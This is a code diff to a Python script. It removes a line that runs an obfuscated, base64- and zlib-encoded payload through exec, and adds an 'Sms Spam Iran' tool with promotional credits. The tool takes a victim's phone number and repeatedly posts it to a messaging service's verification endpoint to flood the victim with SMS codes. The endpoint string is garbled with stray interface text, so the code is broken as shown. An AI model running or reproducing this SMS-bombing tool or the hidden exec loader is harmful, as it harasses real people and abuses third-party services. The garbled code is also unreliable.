@@ -1,4 +1,36 @@
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("fdPz8h8oo5g:APA91bEmK9-EUXt-FsQ1CGIIVBZkAjm4Cd25Si86dxzHuRxcUASTh8hUlvkhFmwoWW2eY9rwAC2Jm6xqXOcKQDuz_0v8TRsdwiBQqyeI516Tt3cshCNi24KVIYqRgAxueQ7youcrHAAi")))
+print("""                                
+  ___ ___  ___ ___ _    ___ __ _  ___
+ (_-</ _ \/ _ `/  ' \  (_-</  ' \(_-<
+/___/ .__/\_,_/_/_/_/ /___/_/_/_/___/
+   /_/                               
+# Sms Spam Iran #
+Creator : Milad Ranjbar
+WebSite : CyberAmooz.Com
+Telegram : t.me/CyberAmooz
+Instagram : instagram.com/CyberAmooz
+....................................
+""")
 
+import requests
+import time
 
+try:
+    print("Note : For Exit Tools ==> Ctrl + C \n")
+    NumberPhone = input("Enter Number Phone (ex: 9170000000) = ")
+
+    if NumberPhone == "" :
+        print("\n[!] Please Enter Phone Number")
+    else :
+        url = "یرایش شماره
+کد فعال سازی
+فعال سازی
+01 : 21
+https://core.gap.im/v1/user/add.json?mobile=%2B989393214518"
+        data = {"cellphone":"+98" + NumberPhone}
+
+    while True:
+        requests.post(url,data=data)
+        print("[+] Send SMS For Victim")
+        time.sleep(4)
+except:
+    print("\n[-] You Exit Tools !!")
